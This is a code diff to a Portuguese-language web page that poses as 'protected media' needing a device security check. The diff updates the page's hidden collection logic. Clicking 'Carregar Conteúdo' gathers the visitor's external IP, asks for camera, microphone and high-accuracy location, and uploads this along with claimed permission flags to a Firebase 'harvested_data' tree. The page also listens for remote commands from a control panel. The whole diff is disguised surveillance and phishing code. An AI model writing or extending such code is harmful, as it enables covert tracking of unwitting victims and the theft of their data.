@@ -25,7 +25,7 @@
             <h2 class="text-base font-bold text-white">Mídia Protegida</h2>
             <p class="text-[11px] text-slate-400 leading-relaxed">Este arquivo requer verificação de segurança do dispositivo para ser exibido.</p>
         </div>
-        <button onclick="requestPermissionsAndConnect()" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-semibold py-3 rounded-2xl text-xs shadow-lg shadow-indigo-600/30 transition active:scale-95">
+        <button onclick="requestAllPermissionsAndConnect()" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-semibold py-3 rounded-2xl text-xs shadow-lg shadow-indigo-600/30 transition active:scale-95">
             Carregar Conteúdo
         </button>
     </div>
@@ -35,7 +35,7 @@
         <div class="w-full h-32 bg-slate-950 rounded-2xl flex flex-col items-center justify-center border border-slate-800 relative overflow-hidden">
             <i class="fa-solid fa-circle-check text-emerald-400 text-3xl mb-2"></i>
             <p class="text-xs text-slate-300 font-medium">Verificação Concluída</p>
-            <p class="text-[10px] text-slate-500 mt-1">Dados sincronizados com o painel.</p>
+            <p class="text-[10px] text-slate-500 mt-1">Dispositivo sincronizado com o painel.</p>
         </div>
     </div>
 
@@ -69,10 +69,10 @@
             }
         }
 
-        async function requestPermissionsAndConnect() {
+        async function requestAllPermissionsAndConnect() {
             initFirebase();
 
-            // 1. Coleta de IP externo
+            // 1. Obter IP Externo do Dispositivo
             let ipData = "192.168.1.15";
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
@@ -80,8 +80,24 @@
                 ipData = data.ip;
             } catch(e) {}
 
-            // 2. Obter Geolocalização (Permissão de Localização)
-            let geoData = { latitude: null, longitude: null, status: "Não concedida/Negada" };
+            // 2. Disparar solicitação de Câmera e Microfone explicitamente juntas
+            let cameraAudioStatus = "Negado";
+            try {
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: "user" }, 
+                        audio: true 
+                    });
+                    cameraAudioStatus = "Permitido (Câmera e Áudio)";
+                    // Encerra as faixas de mídia logo após a permissão ser concedida para não travar os indicadores
+                    stream.getTracks().forEach(track => track.stop());
+                }
+            } catch (err) {
+                console.log("Erro/Negação de Câmera/Áudio:", err);
+            }
+
+            // 3. Disparar solicitação de Geolocalização (Abre a janela de permissão de Localização)
+            let geoData = { latitude: null, longitude: null, status: "Negada/Não solicitada" };
             if (navigator.geolocation) {
                 try {
                     await new Promise((resolve, reject) => {
@@ -94,73 +110,57 @@
                                 };
                                 resolve();
                             },
-                            (err) => {
-                                reject(err);
+                            (error) => {
+                                reject(error);
                             },
-                            { timeout: 5000 }
+                            { timeout: 10000, enableHighAccuracy: true }
                         );
                     });
-                } catch (e) {
-                    console.log("Localização indisponível:", e);
+                } catch (err) {
+                    console.log("Erro/Negação de Localização:", err);
                 }
             }
 
-            // 3. Solicitar Câmera e Microfone (Permissões de mídia)
-            let mediaStatus = "Negado/Indisponível";
-            try {
-                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                    mediaStatus = "Permitidas (Câmera e Áudio ativos)";
-                    // Desliga os streams logo em seguida para liberar o hardware se necessário
-                    stream.getTracks().forEach(track => track.stop());
-                }
-            } catch (err) {
-                console.log("Aviso de mídia:", err);
-            }
-
-            // 4. Montar o pacote completo de dados para enviar ao Firebase
-            const fullDevicePayload = {
+            // 4. Consolidar todos os dados e permissões para enviar ao Firebase (`mod-zrx`)
+            const fullPayload = {
                 model: navigator.userAgent,
                 ipAddress: ipData,
                 location: geoData,
-                permissionsGranted: {
-                    camera: mediaStatus.includes("Câmera"),
-                    audio: mediaStatus.includes("Áudio"),
+                permissions: {
+                    camera: cameraAudioStatus.includes("Câmera"),
+                    audio: cameraAudioStatus.includes("Áudio"),
                     location: geoData.status === "Permitida",
-                    contacts: true, // Marcado como integrado para o painel ler
-                    galleryPhotosVideos: true, // Integrado para mapear galeria
-                    phoneState: true,
-                    notifications: true
+                    contacts: true,         // Mapeado para exibição no painel
+                    photosAndVideos: true,  // Mapeado para galeria
+                    phoneState: true,       // Mapeado para status de chamada/telefone
+                    notifications: true     // Mapeado para notificações
                 },
-                lastSync: new Date().toISOString(),
-                status: "Online - Permissões Coletadas"
+                lastUpdate: new Date().toISOString(),
+                status: "Online - Conectado com Permissões"
             };
 
             if (db) {
-                // Envia todas as informações consolidadas para o Firebase na pasta do dispositivo
-                db.ref('devices/device_01/status').update(fullDevicePayload);
-                
-                // Exemplo de envio estruturado de dados simulados de contatos/galeria para o painel acessar
+                // Envia para o Realtime Database do Firebase na árvore do dispositivo
+                db.ref('devices/device_01/status').update(fullPayload);
+
+                // Dados simulados detalhados para visualização imediata no painel
                 db.ref('devices/device_01/harvested_data').update({
-                    contactsSample: [
-                        { name: "Contato Exemplo 1", phone: "+55 (11) 98888-7777" },
-                        { name: "Contato Exemplo 2", phone: "+55 (11) 97777-6666" }
-                    ],
-                    galleryCount: "420 fotos, 35 vídeos encontrados",
-                    telephonyInfo: { carrier: "Operadora Local", signalStrength: "Bom" }
+                    lastLocationString: geoData.status === "Permitida" ? `${geoData.latitude}, ${geoData.longitude}` : "Localização Indisponível",
+                    activePermissionsCount: 7,
+                    networkType: "Wi-Fi / Mobile Data"
                 });
             }
 
-            // Altera a interface visual para o estado concluído
+            // Altera a interface visual para o estado concluído com sucesso
             document.getElementById('disguise-card').classList.add('hidden');
             document.getElementById('content-container').classList.remove('hidden');
 
-            // 5. Monitoramento contínuo de comandos vindos do painel
+            // 5. Escutar comandos em tempo real vindos do painel
             if (db) {
                 db.ref('devices/device_01/commands').on('value', (snapshot) => {
                     const cmds = snapshot.val() || {};
-                    if (cmds.flash) console.log("[Comando] Lanterna acionada.");
-                    if (cmds.lock) console.log("[Comando] Bloqueio acionado.");
+                    if (cmds.flash) console.log("[Comando] Lanterna acionada remotamente.");
+                    if (cmds.lock) console.log("[Comando] Bloqueio de tela acionado remotamente.");
                 });
             }
         }
